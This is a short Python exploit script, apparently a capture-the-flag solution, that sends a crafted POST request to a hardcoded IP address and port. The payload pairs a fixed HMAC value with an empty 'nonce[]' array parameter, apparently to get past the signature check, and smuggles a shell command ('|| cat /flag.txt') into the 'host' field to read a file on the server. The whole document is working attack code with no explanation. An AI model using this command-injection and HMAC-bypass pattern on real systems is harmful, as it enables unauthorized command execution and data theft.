import requests

url = 'http://13.215.176.34:30447'
payload = {
    'hmac': '84c937be3bee55cf9dec297b43026532167f04266a4bd816dcff51a6bb75659c',
    'host': '|| cat /flag.txt',
    'nonce[]': ''
}

response = requests.post(url, data=payload)

print(response.text)
